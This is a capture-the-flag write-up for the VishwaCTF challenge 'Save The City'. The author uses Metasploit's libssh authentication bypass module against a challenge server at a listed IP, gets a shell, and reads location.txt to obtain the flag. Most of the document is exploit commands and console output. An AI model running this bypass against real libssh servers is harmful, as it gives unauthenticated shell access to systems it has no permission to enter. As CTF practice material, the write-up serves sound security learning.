# Save The City

## Description
```
The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! 
Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. 
You Have To Find The Location ASAP!

nc 13.234.11.113 30684
```

## Writeup

Connecting to the service I only received 1 string as response. <br/>
```sh
$ nc 13.234.11.113 30684 
SSH-2.0-libssh_0.8.1
```

Seeing as they provided a service version I tried to search for an exploit for that. <br/>
```sh
$ msfconsole 
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.3.57-dev                          ]
+ -- --=[ 2400 exploits - 1236 auxiliary - 422 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search libssh

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ssh/libssh_auth_bypass
```

Finding a module for the service I selected the module. <br/>
```sh
msf6 > use 0
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > show options

Module options (auxiliary/scanner/ssh/libssh_auth_bypass):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CHECK_BANNER   true             no        Check banner for libssh
   CMD                             no        Command or alternative shell
   CreateSession  true             no        Create a new session for every successful login
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          22               yes       The target port
   SPAWN_PTY      false            no        Spawn a PTY
   THREADS        1                yes       The number of concurrent threads (max one per host)


Auxiliary action:

   Name   Description
   ----   -----------
   Shell  Spawn a shell



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set RHOSTS 13.234.11.113
RHOSTS => 13.234.11.113
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set RPORT 30684
RPORT => 30684
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true
SPAWN_PTY => true
```

Starting the exploit I was able to gain a access to the system. <br/>
```sh
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > exploit

[*] 13.234.11.113:30684 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details

ls
[*] Command shell session 1 opened (172.27.21.103:33985 -> 13.234.11.113:30684) at 2024-03-01 12:31:58 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
$
-----
          

$ whoami
appuser

$ pwd
/

$ ls -la
total 8
drwxr-xr-x   1 root root  28 Mar  1 11:18 .
drwxr-xr-x   1 root root  28 Mar  1 11:18 ..
-rwxr-xr-x   1 root root   0 Mar  1 11:18 .dockerenv
drwxr-xr-x   1 root root  28 Oct 16  2018 bin
drwxr-xr-x   2 root root   6 Jun 26  2018 boot
drwxr-xr-x   5 root root 360 Mar  1 11:18 dev
drwxr-xr-x   1 root root  66 Mar  1 11:18 etc
drwxr-xr-x   2 root root   6 Jun 26  2018 home
drwxr-xr-x   1 root root  21 Oct 19  2018 lib
drwxr-xr-x   2 root root  34 Oct 11  2018 lib64
-rw-r--r--   1 root root  16 Jan 26 17:37 location.txt
drwxr-xr-x   2 root root   6 Oct 11  2018 media
drwxr-xr-x   2 root root   6 Oct 11  2018 mnt
drwxr-xr-x   2 root root   6 Oct 11  2018 opt
dr-xr-xr-x 480 root root   0 Mar  1 11:18 proc
drwx------   1 root root  40 Jan 26 18:10 root
drwxr-xr-x   1 root root  38 Mar  1 11:18 run
drwxr-xr-x   1 root root  20 Oct 16  2018 sbin
drwxr-xr-x   2 root root   6 Oct 11  2018 srv
-rw-r--r--   1 root root 501 Oct 19  2018 ssh_server_fork.patch
dr-xr-xr-x  13 root root   0 Mar  1 11:18 sys
drwxrwxrwt   1 root root   6 Oct 19  2018 tmp
drwxr-xr-x   1 root root  17 Oct 11  2018 usr
drwxr-xr-x   1 root root  17 Jan 26 16:51 var

$ cat location.txt
elrow-club-pune
```

Finding the suspicious file I encased it with flag-syntax to obtain the flag `VishwaCTF{elrow-club-pune}` which concludes this writeup.
